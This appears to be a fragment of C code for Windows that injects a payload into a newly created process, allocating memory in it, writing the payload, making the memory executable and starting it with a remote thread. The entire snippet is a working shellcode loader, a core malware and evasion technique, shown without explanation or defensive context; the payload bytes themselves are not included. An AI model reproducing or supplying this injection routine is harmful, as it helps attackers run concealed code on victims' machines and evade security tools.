STARTUPINFOW startup = { 0 };
PROCESS_INFORMATION procInfo = { 0 };

CreateProcessW(sProcessName, NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &procInfo);

DWORD iProcessId = procInfo.dwProcessId;
HANDLE hProcess = procInfo.hProcess;
LPVOID pProcess = VirtualAllocEx(hProcess, NULL, sPayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
WriteProcessMemory(hProcess, pProcess, pPayload, sPayloadSize, NULL);
DWORD proc = 0;
VirtualProtectEx(hProcess, pProcess, sPayloadSize, PAGE_EXECUTE_READ, &proc);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pProcess, NULL, 0, NULL);
WaitForSingleObject(hThread, 2000);